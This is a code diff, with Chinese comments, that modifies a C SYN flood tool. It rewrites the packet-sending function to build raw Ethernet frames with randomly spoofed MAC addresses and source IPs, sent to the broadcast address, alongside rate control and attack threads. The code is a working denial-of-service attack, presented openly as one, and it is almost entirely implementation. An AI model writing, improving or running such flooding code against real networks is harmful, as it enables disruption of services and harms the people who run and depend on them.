@@ -1,7 +1,10 @@
+#define _DEFAULT_SOURCE
+
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+// #include <linux/tcp.h>
 #include <pthread.h>
 #include <signal.h>
 #include <stdio.h>
@@ -10,8 +13,13 @@
 #include <sys/socket.h>
 #include <time.h>
 #include <unistd.h>
+#include <getopt.h>
+#include <linux/if_packet.h>
+#include <net/ethernet.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
 
-#include "tcp.h"
+#include "ip_utils.h"
 
 // 全局变量，用于控制攻击线程
 volatile int attack_running = 1;
@@ -94,75 +102,88 @@ uint32_t generate_random_ip() {
 	uint8_t *bytes = (uint8_t *)&addr.s_addr;
 	bytes[0] = 192;
 	bytes[1] = 168;
-	bytes[2] = 1;// rand() % 256;
+	bytes[2] = 1; // rand() % 256;
 	bytes[3] = rand() % 256;
 
 	return addr.s_addr;
 }
 
-// 发送SYN Flood包
+// 修改后的发送SYN Flood包函数
 void send_syn_flood(int raw_sock, uint32_t target_ip, uint16_t target_port,
-					int use_ip_spoofing, int packet_count, int delay_ms) {
-	char packet[4096];
-	struct sockaddr_in dest_addr;
-	int packets_sent = 0;
+                    int use_ip_spoofing, int packet_count, int delay_ms) {
+    char packet[4096];
+    struct sockaddr_ll dest_addr;
+    int packets_sent = 0;
 
-	memset(&dest_addr, 0, sizeof(dest_addr));
-	dest_addr.sin_family = AF_INET;
-	dest_addr.sin_addr.s_addr = target_ip;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sll_family = AF_PACKET;
+    dest_addr.sll_protocol = htons(ETH_P_IP);
+    dest_addr.sll_halen = ETH_ALEN;
 
-	if (quiet_mode == 0) {
-		printf("Starting SYN Flood attack...\n");
-		printf("Target: %s:%d\n", inet_ntoa(*(struct in_addr *)&target_ip),
-			   target_port);
-		printf("Packets: %d, Delay: %dms, IP Spoofing: %s\n\n", packet_count,
-			   delay_ms, use_ip_spoofing ? "Yes" : "No");
-	}
+    if (quiet_mode == 0) {
+        printf("Starting SYN Flood attack...\n");
+        printf("Target: %s:%d\n", inet_ntoa(*(struct in_addr *)&target_ip),
+               target_port);
+        printf("Packets: %d, Delay: %dms, IP Spoofing: %s\n\n", packet_count,
+               delay_ms, use_ip_spoofing ? "Yes" : "No");
+    }
 
-	for (int i = 0; i < packet_count && attack_running; i++) {
-		memset(packet, 0, sizeof(packet));
+    for (int i = 0; i < packet_count && attack_running; i++) {
+        memset(packet, 0, sizeof(packet));
 
-		struct iphdr *ip = (struct iphdr *)packet;
-		struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+        struct ethhdr *eth = (struct ethhdr *)packet;
+        struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ethhdr));
+        struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ethhdr) + sizeof(struct iphdr));
 
-		// 生成随机源IP和端口（IP欺骗）
-		uint32_t src_ip;
-		if (use_ip_spoofing) {
-			src_ip = generate_random_ip();
-		} else {
-			// 使用固定的伪造源IP
-			src_ip = inet_addr("192.168.1.100");
-		}
+        // 生成随机源IP和端口（IP欺骗）
+        uint32_t src_ip;
+        if (use_ip_spoofing) {
+            src_ip = generate_random_ip();
+        } else {
+            // 使用固定的伪造源IP
+            src_ip = inet_addr("192.168.1.100");
+        }
 
-		uint16_t src_port = 1024 + (rand() % 64512); // 随机端口
+        uint16_t src_port = 1024 + (rand() % 64512); // 随机端口
 
-		// 构建数据包
-		build_ip_header(ip, src_ip, target_ip,
-						sizeof(struct iphdr) + sizeof(struct tcphdr));
-		build_tcp_header(tcp, src_port, target_port, rand(), 0x02); // SYN标志
+        // 构建数据包
+        build_ip_header(ip, src_ip, target_ip,
+                        sizeof(struct iphdr) + sizeof(struct tcphdr));
+        build_tcp_header(tcp, src_port, target_port, rand(), 0x02); // SYN标志
 
-		// 计算校验和并发送
-		tcp->check = calculate_tcp_checksum(ip, tcp);
+        // 计算校验和
+        tcp->check = calculate_tcp_checksum(ip, tcp);
 
-		ssize_t sent = sendto(raw_sock, packet, ntohs(ip->tot_len), 0,
-							  (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        // 生成随机MAC地址
+        uint8_t src_mac[6];
+        generate_random_mac(src_mac);
+        memcpy(eth->h_source, src_mac, ETH_ALEN);
+        memset(eth->h_dest, 0xff, ETH_ALEN); // 广播地址
+        eth->h_proto = htons(ETH_P_IP);
 
-		if (sent > 0) {
-			packets_sent++;
-			if (quiet_mode == 0 && packets_sent % 100 == 0) {
-				printf("Sent %d SYN packets...\n", packets_sent);
-			}
-		}
+        // 设置目标地址的MAC
+        memcpy(dest_addr.sll_addr, eth->h_dest, ETH_ALEN);
 
-		// 延迟控制攻击速度
-		if (delay_ms > 0) {
-			usleep(delay_ms * 1000);
-		}
-	}
-	if (quiet_mode == 0) {
-		printf("\nTotal packets sent: %d\n", packets_sent);
-	}
+        ssize_t sent = sendto(raw_sock, packet, sizeof(struct ethhdr) + ntohs(ip->tot_len), 0,
+                              (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        if (sent > 0) {
+            packets_sent++;
+            if (quiet_mode == 0 && packets_sent % 100 == 0) {
+                printf("Sent %d SYN packets...\n", packets_sent);
+            }
+        }
+
+        // 延迟控制攻击速度
+        if (delay_ms > 0) {
+            usleep(delay_ms * 1000);
+        }
+    }
+    if (quiet_mode == 0) {
+        printf("\nTotal packets sent: %d\n", packets_sent);
+    }
 }
+
 struct attack_params {
 	uint32_t target_ip;
 	uint16_t target_port;
@@ -170,6 +191,7 @@ struct attack_params {
 	int packet_count;
 	int delay_ms;
 };
+
 // 攻击线程函数
 void *attack_thread(void *arg) {
 	while (always_on && attack_running) {
